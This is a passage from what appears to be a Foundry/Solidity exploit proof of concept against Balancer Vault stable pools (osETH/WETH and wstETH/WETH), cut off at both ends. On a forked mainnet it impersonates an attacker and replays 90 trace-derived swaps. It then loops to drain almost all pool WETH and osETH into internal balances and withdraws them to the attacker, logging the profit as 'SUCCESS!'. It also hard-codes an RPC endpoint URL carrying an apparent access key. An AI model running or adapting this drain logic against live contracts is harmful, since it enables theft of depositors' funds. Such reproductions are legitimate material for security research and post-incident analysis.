        IERC20(osETH_WETH_BPT).approve(address(VAULT), type(uint256).max);
        IERC20(osETH).approve(address(VAULT), type(uint256).max);
        WETH.approve(address(VAULT), type(uint256).max);

        // Use internal balance to accumulate funds in Vault
        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: ATTACKER,
            fromInternalBalance: false,
            recipient: payable(ATTACKER),
            toInternalBalance: true  // Keep funds in Vault internal balance
        });

        // swaps from transaction trace
        ExactSwapData[90] memory swaps;
        swaps[0] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: osETH, amount: 1176332457006284629565, expectedIn: 1201076805421509281395, indexIn: 2, indexOut: 0 });
        swaps[1] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: address(WETH), amount: 801957109969833064265, expectedIn: 764358109853518473498, indexIn: 2, indexOut: 1 });
        swaps[2] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: osETH, amount: 11763324570062846295, expectedIn: 12010656467295420512, indexIn: 2, indexOut: 0 });
        swaps[3] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: address(WETH), amount: 8019571099698330643, expectedIn: 7643510086077799864, indexIn: 2, indexOut: 1 });
        swaps[4] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: osETH, amount: 117633245700628463, expectedIn: 120105448334705898, indexIn: 2, indexOut: 0 });
        swaps[5] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: address(WETH), amount: 80195710996983306, expectedIn: 76434391222014551, indexIn: 2, indexOut: 1 });
        swaps[6] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: osETH, amount: 1176332457006285, expectedIn: 1201042840693972, indexIn: 2, indexOut: 0 });
        swaps[7] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: address(WETH), amount: 801957109969833, expectedIn: 764337295067158, indexIn: 2, indexOut: 1 });
        swaps[8] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: osETH, amount: 11763324570063, expectedIn: 12009836562076, indexIn: 2, indexOut: 0 });
        swaps[9] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: address(WETH), amount: 8019571099699, expectedIn: 7643781996846, indexIn: 2, indexOut: 1 });
        swaps[10] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: osETH, amount: 117633245700, expectedIn: 119833719798, indexIn: 2, indexOut: 0 });
        swaps[11] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: address(WETH), amount: 80195710997, expectedIn: 76700588074, indexIn: 2, indexOut: 1 });
        swaps[12] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: osETH, amount: 1176332457, expectedIn: 1195100784, indexIn: 2, indexOut: 0 });
        swaps[13] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: address(WETH), amount: 801957110, expectedIn: 770251646, indexIn: 1, indexOut: 0 });
        swaps[14] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: osETH, amount: 11763325, expectedIn: 11949997, indexIn: 1, indexOut: 2 });
        swaps[15] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: address(WETH), amount: 8019571, expectedIn: 7703694, indexIn: 1, indexOut: 0 });
        swaps[16] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: osETH, amount: 117633, expectedIn: 119501, indexIn: 1, indexOut: 2 });
        swaps[17] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: address(WETH), amount: 80196, expectedIn: 77049, indexIn: 1, indexOut: 0 });
        swaps[18] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: osETH, amount: 1176, expectedIn: 1196, indexIn: 1, indexOut: 2 });
        swaps[19] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: address(WETH), amount: 802, expectedIn: 771, indexIn: 1, indexOut: 0 });
        swaps[20] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: osETH, amount: 12, expectedIn: 12, indexIn: 1, indexOut: 2 });
        swaps[21] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: address(WETH), amount: 8, expectedIn: 8, indexIn: 1, indexOut: 0 });
        swaps[22] = ExactSwapData({ tokenIn: osETH, tokenOut: osETH_WETH_BPT, amount: 1176332457006284629565, expectedIn: 1008333333333333333333, indexIn: 2, indexOut: 1 });
        swaps[23] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH_WETH_BPT, amount: 801957109969833064265, expectedIn: 686666666666666666667, indexIn: 0, indexOut: 1 });
        swaps[24] = ExactSwapData({ tokenIn: osETH, tokenOut: osETH_WETH_BPT, amount: 11763324570062846295, expectedIn: 10083246945111111111, indexIn: 2, indexOut: 1 });
        swaps[25] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH_WETH_BPT, amount: 8019571099698330643, expectedIn: 6866628896296296296, indexIn: 0, indexOut: 1 });
        swaps[26] = ExactSwapData({ tokenIn: osETH, tokenOut: osETH_WETH_BPT, amount: 117633245700628463, expectedIn: 100831946217631962, indexIn: 2, indexOut: 1 });
        swaps[27] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH_WETH_BPT, amount: 80195710996983306, expectedIn: 68666016678209876, indexIn: 0, indexOut: 1 });
        swaps[28] = ExactSwapData({ tokenIn: osETH, tokenOut: osETH_WETH_BPT, amount: 1176332457006285, expectedIn: 1008318980750341, indexIn: 2, indexOut: 1 });
        swaps[29] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH_WETH_BPT, amount: 801957109969833, expectedIn: 686659785432099, indexIn: 0, indexOut: 1 });
        swaps[30] = ExactSwapData({ tokenIn: osETH, tokenOut: osETH_WETH_BPT, amount: 11763324570063, expectedIn: 10083185107162, indexIn: 2, indexOut: 1 });
        swaps[31] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH_WETH_BPT, amount: 8019571099699, expectedIn: 6866567074074, indexIn: 0, indexOut: 1 });
        swaps[32] = ExactSwapData({ tokenIn: osETH, tokenOut: osETH_WETH_BPT, amount: 117633245700, expectedIn: 100830992093, indexIn: 2, indexOut: 1 });
        swaps[33] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH_WETH_BPT, amount: 80195710997, expectedIn: 68665726543, indexIn: 0, indexOut: 1 });
        swaps[34] = ExactSwapData({ tokenIn: osETH, tokenOut: osETH_WETH_BPT, amount: 1176332457, expectedIn: 1008309292, indexIn: 2, indexOut: 1 });
        swaps[35] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH_WETH_BPT, amount: 801957110, expectedIn: 686657160, indexIn: 0, indexOut: 1 });
        swaps[36] = ExactSwapData({ tokenIn: osETH, tokenOut: osETH_WETH_BPT, amount: 11763325, expectedIn: 10083091, indexIn: 2, indexOut: 1 });
        swaps[37] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH_WETH_BPT, amount: 8019571, expectedIn: 6866570, indexIn: 0, indexOut: 1 });
        swaps[38] = ExactSwapData({ tokenIn: osETH, tokenOut: osETH_WETH_BPT, amount: 117633, expectedIn: 100831, indexIn: 2, indexOut: 1 });
        swaps[39] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH_WETH_BPT, amount: 80196, expectedIn: 68666, indexIn: 0, indexOut: 1 });
        swaps[40] = ExactSwapData({ tokenIn: osETH, tokenOut: osETH_WETH_BPT, amount: 1176, expectedIn: 1009, indexIn: 2, indexOut: 1 });
        swaps[41] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH_WETH_BPT, amount: 802, expectedIn: 687, indexIn: 0, indexOut: 1 });
        swaps[42] = ExactSwapData({ tokenIn: osETH, tokenOut: osETH_WETH_BPT, amount: 12, expectedIn: 11, indexIn: 2, indexOut: 1 });
        swaps[43] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH_WETH_BPT, amount: 8, expectedIn: 7, indexIn: 0, indexOut: 1 });
        swaps[44] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 686666666666666666667, expectedIn: 593820610, indexIn: 2, indexOut: 0 });
        swaps[45] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 593820593, expectedIn: 1176332457006284629565, indexIn: 0, indexOut: 2 });
        swaps[46] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, expectedIn: 34500909009792959, indexIn: 0, indexOut: 2 });
        swaps[47] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 480000000000, expectedIn: 221639092, indexIn: 2, indexOut: 0 });
        swaps[48] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 221639075, expectedIn: 25626928172, indexIn: 0, indexOut: 2 });
        swaps[49] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, expectedIn: 24492173718, indexIn: 0, indexOut: 2 });
        swaps[50] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 340000000000, expectedIn: 74653989, indexIn: 2, indexOut: 0 });
        swaps[51] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 74653972, expectedIn: 25626928172, indexIn: 0, indexOut: 2 });
        swaps[52] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 38000000000, expectedIn: 142678241, indexIn: 2, indexOut: 0 });
        swaps[53] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 142678224, expectedIn: 8793968805, indexIn: 0, indexOut: 2 });
        swaps[54] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, expectedIn: 18271758398, indexIn: 0, indexOut: 2 });
        swaps[55] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 27000000000, expectedIn: 37323791, indexIn: 2, indexOut: 0 });
        swaps[56] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 37323774, expectedIn: 6175705982, indexIn: 0, indexOut: 2 });
        swaps[57] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, expectedIn: 12989833396, indexIn: 0, indexOut: 2 });
        swaps[58] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 19000000000, expectedIn: 7483, indexIn: 2, indexOut: 0 });
        swaps[59] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 7466, expectedIn: 4298444362, indexIn: 0, indexOut: 2 });
        swaps[60] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, expectedIn: 9436861308, indexIn: 0, indexOut: 2 });
        swaps[61] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 14000000000, expectedIn: 70418664, indexIn: 2, indexOut: 0 });
        swaps[62] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 70418647, expectedIn: 3241446426, indexIn: 0, indexOut: 2 });
        swaps[63] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, expectedIn: 7100333832, indexIn: 0, indexOut: 2 });
        swaps[64] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 10000000000, expectedIn: 18076923, indexIn: 2, indexOut: 0 });
        swaps[65] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 18076906, expectedIn: 2300867990, indexIn: 0, indexOut: 2 });
        swaps[66] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, expectedIn: 5187974123, indexIn: 0, indexOut: 2 });
        swaps[67] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 7000000000, expectedIn: 352834, indexIn: 2, indexOut: 0 });
        swaps[68] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 352817, expectedIn: 1628449028, indexIn: 0, indexOut: 2 });
        swaps[69] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, expectedIn: 3791172740, indexIn: 0, indexOut: 2 });
        swaps[70] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 5000000000, expectedIn: 25101608, indexIn: 2, indexOut: 0 });
        swaps[71] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 25101591, expectedIn: 1175925341, indexIn: 0, indexOut: 2 });
        swaps[72] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, expectedIn: 2808251434, indexIn: 0, indexOut: 2 });
        swaps[73] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 4000000000, expectedIn: 6324607, indexIn: 2, indexOut: 0 });
        swaps[74] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 6324590, expectedIn: 857031912, indexIn: 0, indexOut: 2 });
        swaps[75] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, expectedIn: 2200990337, indexIn: 0, indexOut: 2 });
        swaps[76] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 3000000000, expectedIn: 11833942, indexIn: 2, indexOut: 0 });
        swaps[77] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 11833925, expectedIn: 656831025, indexIn: 0, indexOut: 2 });
        swaps[78] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, expectedIn: 1748326734, indexIn: 0, indexOut: 2 });
        swaps[79] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 2000000000, expectedIn: 1448151, indexIn: 2, indexOut: 0 });
        swaps[80] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 1448134, expectedIn: 479717644, indexIn: 0, indexOut: 2 });
        swaps[81] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, expectedIn: 1401764695, indexIn: 0, indexOut: 2 });
        swaps[82] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 1000000000, expectedIn: 5580844, indexIn: 2, indexOut: 0 });
        swaps[83] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 5580827, expectedIn: 356455598, indexIn: 0, indexOut: 2 });
        swaps[84] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, expectedIn: 1151619856, indexIn: 0, indexOut: 2 });
        swaps[85] = ExactSwapData({ tokenIn: osETH, tokenOut: osETH_WETH_BPT, amount: 10000000000, expectedIn: 87478886, indexIn: 2, indexOut: 1 });
        swaps[86] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH_WETH_BPT, amount: 10000000000000, expectedIn: 141523892659, indexIn: 0, indexOut: 1 });
        swaps[87] = ExactSwapData({ tokenIn: osETH, tokenOut: osETH_WETH_BPT, amount: 10000000000000000, expectedIn: 128359205147277, indexIn: 2, indexOut: 1 });
        swaps[88] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH_WETH_BPT, amount: 10000000000000000000, expectedIn: 136238774513878100, indexIn: 0, indexOut: 1 });
        swaps[89] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH_WETH_BPT, amount: 990619479082334998746, expectedIn: 12103545600526537726, indexIn: 0, indexOut: 1 });

        console.log("Total swaps:", swaps.length);

        uint256 successCount = 0;

        for (uint i = 0; i < swaps.length; i++) {
            IBalancerVault.SingleSwap memory swap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_OSETH,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(swaps[i].tokenIn),
                assetOut: IAsset(swaps[i].tokenOut),
                amount: swaps[i].amount,
                userData: ""
            });

            try VAULT.swap(swap, funds, type(uint256).max, block.timestamp + 3600) returns (uint256 amountIn) {
                console.log("Swap", i, "SUCCESS - AmountIn:", amountIn);
                successCount++;
            } catch Error(string memory reason) {
                console.log("Swap", i, "FAILED:", reason);
            } catch {
                console.log("Swap", i, "FAILED (no reason)");
            }

            if (i % 5 == 4) {
                (,uint256[] memory currentBal,) = VAULT.getPoolTokens(POOL_ID_OSETH);
                console.log("After swap", i+1);
                console.log("  BPT:", currentBal[0]);
                console.log("  osETH:", currentBal[1]);
                console.log("  WETH:", currentBal[2]);
            }
        }

        console.log("Swaps executed:", successCount);
        console.log("Total swaps:", swaps.length);

        // Continue draining the pool until almost empty
        (,uint256[] memory midBalances,) = VAULT.getPoolTokens(POOL_ID_OSETH);
        console.log("POOL STATE BEFORE:");
        console.log("  WETH (index 0):", midBalances[0]);
        console.log("  osETH (index 2):", midBalances[2]);

        uint256 additionalSwaps = 0;

        // Drain remaining WETH
        while (midBalances[0] > 1e9) {
            (,midBalances,) = VAULT.getPoolTokens(POOL_ID_OSETH);

            uint256 wethToDrain = (midBalances[0] * 95) / 100;
            if (wethToDrain < 1e9) break;

            IBalancerVault.SingleSwap memory drainSwap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_OSETH,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(osETH_WETH_BPT),
                assetOut: IAsset(address(WETH)),
                amount: wethToDrain,
                userData: ""
            });

            try VAULT.swap(drainSwap, funds, type(uint256).max, block.timestamp + 3600) {
                additionalSwaps++;
            } catch {
                break;
            }

            if (additionalSwaps > 100) break;
        }

        // Drain remaining osETH
        while (midBalances[2] > 1e9) {
            (,midBalances,) = VAULT.getPoolTokens(POOL_ID_OSETH);

            uint256 osethToDrain = (midBalances[2] * 95) / 100;
            if (osethToDrain < 1e9) break;

            IBalancerVault.SingleSwap memory drainSwap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_OSETH,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(osETH_WETH_BPT),
                assetOut: IAsset(osETH),
                amount: osethToDrain,
                userData: ""
            });

            try VAULT.swap(drainSwap, funds, type(uint256).max, block.timestamp + 3600) {
                additionalSwaps++;
            } catch {
                break;
            }

            if (additionalSwaps > 100) break;
        }

        console.log("Additional swaps:", additionalSwaps);

        // withdraw manageUserBalance()
        console.log("=== WITHDRAWAL manageUserBalance() ===");

        IERC20[] memory internalTokens = new IERC20[](3);
        internalTokens[0] = IERC20(address(WETH));
        internalTokens[1] = IERC20(osETH_WETH_BPT);
        internalTokens[2] = IERC20(osETH);

        uint256[] memory internalBalances = VAULT.getInternalBalance(ATTACKER, internalTokens);

        console.log("VAULT BALANCE BEFORE:");
        console.log("  Internal WETH:", internalBalances[0] / 1e18, "ETH");
        console.log("  Internal BPT:", internalBalances[1] / 1e18, "ETH");
        console.log("  Internal osETH:", internalBalances[2] / 1e18, "ETH");

        console.log("ATTACKER BALANCE BEFORE:");
        console.log("  WETH:", WETH.balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("  BPT:", IERC20(osETH_WETH_BPT).balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("  osETH:", IERC20(osETH).balanceOf(ATTACKER) / 1e18, "ETH");

        if (internalBalances[0] > 0 || internalBalances[1] > 0 || internalBalances[2] > 0) {
            uint256 opsCount = 0;
            if (internalBalances[0] > 0) opsCount++;
            if (internalBalances[1] > 0) opsCount++;
            if (internalBalances[2] > 0) opsCount++;

            IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](opsCount);
            uint256 opIndex = 0;

            if (internalBalances[0] > 0) {
                ops[opIndex] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(address(WETH)),
                    amount: internalBalances[0],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
                opIndex++;
            }

            if (internalBalances[1] > 0) {
                ops[opIndex] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(osETH_WETH_BPT),
                    amount: internalBalances[1],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
                opIndex++;
            }

            if (internalBalances[2] > 0) {
                ops[opIndex] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(osETH),
                    amount: internalBalances[2],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            // withdraw manageUserBalance()
            VAULT.manageUserBalance(ops);
            console.log("ATTACKER BALANCE AFTER:");
            console.log("  WETH:", WETH.balanceOf(ATTACKER) / 1e18, "ETH");
            console.log("  BPT:", IERC20(osETH_WETH_BPT).balanceOf(ATTACKER) / 1e18, "ETH");
            console.log("  osETH:", IERC20(osETH).balanceOf(ATTACKER) / 1e18, "ETH");

            uint256[] memory internalBalancesAfter = VAULT.getInternalBalance(ATTACKER, internalTokens);
            console.log("VAULT BALANCE AFTER:");
            console.log("  Internal WETH:", internalBalancesAfter[0], "wei");
            console.log("  Internal BPT:", internalBalancesAfter[1], "wei");
            console.log("  Internal osETH:", internalBalancesAfter[2], "wei");

            console.log("WETH withdrawn:", internalBalances[0] / 1e18, "ETH");
            console.log("BPT withdrawn:", internalBalances[1] / 1e18, "ETH");
            console.log("osETH withdrawn:", internalBalances[2] / 1e18, "ETH");

            console.log("Total value:", (internalBalances[0] + internalBalances[2]) / 1e18, "ETH");
        } else {
            console.log("No internal balances to withdraw");
        }

        vm.stopPrank();

        (,uint256[] memory finalBalances,) = VAULT.getPoolTokens(POOL_ID_OSETH);

        console.log("FINAL STATE:");
        console.log("WETH (index 0):", finalBalances[0]);
        console.log("BPT (index 1):", finalBalances[1]);
        console.log("osETH (index 2):", finalBalances[2]);

        console.log("POOL DELTAS:");
        console.log("WETH delta:");
        console.logInt(int256(finalBalances[0]) - int256(initialBalances[0]));
        console.log("BPT delta:");
        console.logInt(int256(finalBalances[1]) - int256(initialBalances[1]));
        console.log("osETH delta:");
        console.logInt(int256(finalBalances[2]) - int256(initialBalances[2]));

        console.log("ATTACKER BALANCES:");
        console.log("WETH:", WETH.balanceOf(ATTACKER));
        console.log("osETH:", IERC20(osETH).balanceOf(ATTACKER));
        console.log("BPT:", IERC20(osETH_WETH_BPT).balanceOf(ATTACKER));

        console.log("Total swaps executed:", successCount + additionalSwaps);
        console.log("  Original swaps:", successCount);
        console.log("  Additional swaps:", additionalSwaps);

        console.log("SUCCESS!");
    }

    function testWstEthPool() public {
        vm.createSelectFork(
            "https://greatest-prettiest-shard.quiknode.pro/b88e7d9ece3886528f7341abb3eabffa655fdc9c",
            23717101
        );

        console.log("Pool: wstETH/WETH (0x93d19926...05c2)");

        (IERC20[] memory tokens, uint256[] memory initialBalances,) = VAULT.getPoolTokens(POOL_ID_WSTETH);

        console.log("INITIAL STATE:");
        console.log("WETH (index 0):", initialBalances[0]);
        console.log("BPT (index 1):", initialBalances[1]);
        console.log("wstETH (index 2):", initialBalances[2]);

        // Fund attacker with BPT tokens
        deal(wstETH_WETH_BPT, ATTACKER, 10000 ether);

        vm.startPrank(ATTACKER);
        IERC20(wstETH_WETH_BPT).approve(address(VAULT), type(uint256).max);
        IERC20(wstETH).approve(address(VAULT), type(uint256).max);
        WETH.approve(address(VAULT), type(uint256).max);

        // Use internal balance to accumulate funds in Vault
        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: ATTACKER,
            fromInternalBalance: false,
            recipient: payable(ATTACKER),
            toInternalBalance: true  // Keep funds in Vault internal balance
        });

        // swaps from transaction trace
        ExactSwapData[90] memory swaps;
        swaps[0] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 1176332457006284629565, expectedIn: 1201076805421509281395, indexIn: 1, indexOut: 2 });
        swaps[1] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 801957109969833064265, expectedIn: 764358109853518473498, indexIn: 1, indexOut: 0 });
        swaps[2] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 11763324570062846295, expectedIn: 12010656467295420512, indexIn: 1, indexOut: 2 });
        swaps[3] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 8019571099698330643, expectedIn: 7643510086077799864, indexIn: 1, indexOut: 0 });
        swaps[4] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 117633245700628463, expectedIn: 120105448334705898, indexIn: 1, indexOut: 2 });
        swaps[5] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 80195710996983306, expectedIn: 76434391222014551, indexIn: 1, indexOut: 0 });
        swaps[6] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 1176332457006285, expectedIn: 1201042840693972, indexIn: 1, indexOut: 2 });
        swaps[7] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 801957109969833, expectedIn: 764337295067158, indexIn: 1, indexOut: 0 });
        swaps[8] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 11763324570063, expectedIn: 12009836562076, indexIn: 1, indexOut: 2 });
        swaps[9] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 8019571099699, expectedIn: 7643781996846, indexIn: 1, indexOut: 0 });
        swaps[10] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 117633245700, expectedIn: 119833719798, indexIn: 1, indexOut: 2 });
        swaps[11] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 80195710997, expectedIn: 76700588074, indexIn: 1, indexOut: 0 });
        swaps[12] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 1176332457, expectedIn: 1195100784, indexIn: 1, indexOut: 2 });
        swaps[13] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 801957110, expectedIn: 770251646, indexIn: 1, indexOut: 0 });
        swaps[14] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 11763325, expectedIn: 11949997, indexIn: 1, indexOut: 2 });
        swaps[15] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 8019571, expectedIn: 7703694, indexIn: 1, indexOut: 0 });
        swaps[16] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 117633, expectedIn: 119501, indexIn: 1, indexOut: 2 });
        swaps[17] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 80196, expectedIn: 77049, indexIn: 1, indexOut: 0 });
        swaps[18] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 1176, expectedIn: 1196, indexIn: 1, indexOut: 2 });
        swaps[19] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 802, expectedIn: 771, indexIn: 1, indexOut: 0 });
        swaps[20] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 12, expectedIn: 12, indexIn: 1, indexOut: 2 });
        swaps[21] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 8, expectedIn: 8, indexIn: 1, indexOut: 0 });
        swaps[22] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 1176332457006284629565, expectedIn: 1008333333333333333333, indexIn: 2, indexOut: 1 });
        swaps[23] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 801957109969833064265, expectedIn: 686666666666666666667, indexIn: 0, indexOut: 1 });
        swaps[24] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 11763324570062846295, expectedIn: 10083246945111111111, indexIn: 2, indexOut: 1 });
        swaps[25] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 8019571099698330643, expectedIn: 6866628896296296296, indexIn: 0, indexOut: 1 });
        swaps[26] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 117633245700628463, expectedIn: 100831946217631962, indexIn: 2, indexOut: 1 });
        swaps[27] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 80195710996983306, expectedIn: 68666016678209876, indexIn: 0, indexOut: 1 });
        swaps[28] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 1176332457006285, expectedIn: 1008318980750341, indexIn: 2, indexOut: 1 });
        swaps[29] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 801957109969833, expectedIn: 686659785432099, indexIn: 0, indexOut: 1 });
        swaps[30] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 11763324570063, expectedIn: 10083185107162, indexIn: 2, indexOut: 1 });
        swaps[31] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 8019571099699, expectedIn: 6866567074074, indexIn: 0, indexOut: 1 });
        swaps[32] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 117633245700, expectedIn: 100830992093, indexIn: 2, indexOut: 1 });
        swaps[33] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 80195710997, expectedIn: 68665726543, indexIn: 0, indexOut: 1 });
        swaps[34] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 1176332457, expectedIn: 1008309292, indexIn: 2, indexOut: 1 });
        swaps[35] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 801957110, expectedIn: 686657160, indexIn: 0, indexOut: 1 });
        swaps[36] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 11763325, expectedIn: 10083091, indexIn: 2, indexOut: 1 });
